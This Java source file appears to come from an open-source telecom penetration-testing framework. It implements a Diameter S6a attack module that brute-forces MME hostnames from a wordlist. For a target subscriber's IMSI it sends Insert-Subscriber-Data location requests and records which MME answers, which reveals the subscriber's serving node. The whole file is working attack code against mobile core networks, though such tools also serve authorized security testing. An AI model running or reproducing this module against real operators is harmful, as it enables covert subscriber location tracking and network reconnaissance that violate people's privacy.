/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.intruder.diameter.usecases.attacks.infogathering;

import com.rodan.intruder.diameter.entities.event.S6aListener;
import com.rodan.intruder.diameter.entities.event.model.InsertSubscriberDataAnswer;
import com.rodan.intruder.diameter.entities.event.model.ResultCode;
import com.rodan.intruder.diameter.entities.payload.DiameterPayload;
import com.rodan.intruder.diameter.entities.payload.s6a.IdrPayload;
import com.rodan.intruder.diameter.usecases.attacks.DiameterBruteforceModuleTemplate;
import com.rodan.intruder.diameter.usecases.model.DiameterModuleConstants;
import com.rodan.intruder.diameter.usecases.model.DiameterModuleOptions;
import com.rodan.intruder.diameter.usecases.model.infogathering.MmeIdrBruteforceOptions;
import com.rodan.intruder.diameter.usecases.model.infogathering.MmeIdrBruteforceResponse;
import com.rodan.intruder.diameter.usecases.port.DiameterGateway;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Module;
import com.rodan.library.model.error.SystemException;
import com.rodan.library.model.notification.NotificationType;
import com.rodan.intruder.kernel.usecases.SignalingModule;
import com.rodan.intruder.kernel.usecases.model.LazyPayloadCollection;
import com.rodan.library.util.Util;
import lombok.Builder;
import lombok.SneakyThrows;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

import java.io.File;

@Module(name = DiameterModuleConstants.MME_IDR_BF_NAME, category = DiameterModuleConstants.INFO_GATHERING_CATEGORY_DISPLAY_NAME,
        displayName = DiameterModuleConstants.MME_IDR_BF_DISPLAY_NAME, brief = DiameterModuleConstants.MME_IDR_BF_BRIEF,
        description = DiameterModuleConstants.MME_IDR_BF_DESCRIPTION, rank = DiameterModuleConstants.MME_IDR_BF_RANK,
        mainPayload = Constants.ULR_PAYLOAD_NAME)
public class MmeIdrBruteforceModule extends DiameterBruteforceModuleTemplate implements SignalingModule, S6aListener {
    final static Logger logger = LogManager.getLogger(MmeIdrBruteforceModule.class);

    @Builder
    public MmeIdrBruteforceModule(DiameterGateway gateway, DiameterModuleOptions moduleOptions) {
        super(gateway, moduleOptions);
        var options = (MmeIdrBruteforceOptions) moduleOptions;
        if (!options.getDelayMillis().isBlank()) {
            setBruteforceDelay(Integer.valueOf(options.getDelayMillis()));
        }
        setTaskWaitTime(3000); // Increase wait time to wait for possible valid remote node replies
        setWaitForResponseFailedMessage("Failed to retrieve current MME of user");
    }

    @SneakyThrows // TODO IMP: remove and handle/throw system exception
    @Override
    protected void generatePayload() {
        logger.debug("Generating payload");
        logger.debug("Module Options: " + moduleOptions);
        var options = (MmeIdrBruteforceOptions) moduleOptions;
        var filePath = Util.getWordListsDirectory() + File.separator + options.getTargetMmeFileName();

        var mmeHostStream = Util.loadWordListLazy(filePath);
        var mmeHostFileSize = Util.getFileSize(filePath);
        var lazyPayloadCollection = LazyPayloadCollection.<DiameterPayload>builder()
                .dataSource(mmeHostStream).totalDataSize(mmeHostFileSize)
                .payloadGenerator((host) ->
                    IdrPayload.builder()
                            .usage(IdrPayload.Usage.LOCATION)
                            .destinationRealm(options.getDestinationRealm())
                            .imsi(options.getImsi()).targetMmeHost(host)
                            .build()
                )
                .build();

        setPayloadIterator(lazyPayloadCollection);
        var dummyPayload = IdrPayload.builder()
                .usage(IdrPayload.Usage.LOCATION)
                .destinationRealm(options.getDestinationRealm())
                .imsi(options.getImsi()).targetMmeHost("host")
                .build();
        setMainPayload(dummyPayload);
        setCurrentPayload(getMainPayload());
        logger.debug("Payloads: " + lazyPayloadCollection);
    }

    @Override
    protected void addServiceListener() throws SystemException {
        logger.debug("Adding service listeners");
        getGateway().addS6aListener(this);
    }

    @Override
    protected void cleanup() throws SystemException {
        if (this.getGateway() != null)
            this.getGateway().removeS6aListener(this);
    }

    @Override
    public void doInsertSubscriberDataAnswerEvent(InsertSubscriberDataAnswer answer) {
        logger.debug("[[[[ doInsertSubscriberDataAnswerEvent ]]]]");
        logger.debug(answer);
        moduleResponse = MmeIdrBruteforceResponse.builder()
                .mmeHost(answer.getOriginHost())
                .build();
        setResultReceived(true);
        logger.debug("IDR completed!");
    }

    @Override
    public void onFailedResultCode(ResultCode resultCode) {
        logger.debug("[[[[[[[[[[    onFailedResultCode      ]]]]]]]]]]");
        var msg = String.format("resultCode: [%s]", resultCode);
        logger.debug(msg);

        if (isPossibleValidNodeResultCode(resultCode) && !isUnknownUserResultCode(resultCode)) {
            msg = "Received " + resultCode.getShortMessage() + " from " + resultCode.getOriginHost();
            notify(msg, NotificationType.WARNING);
        }
    }
}
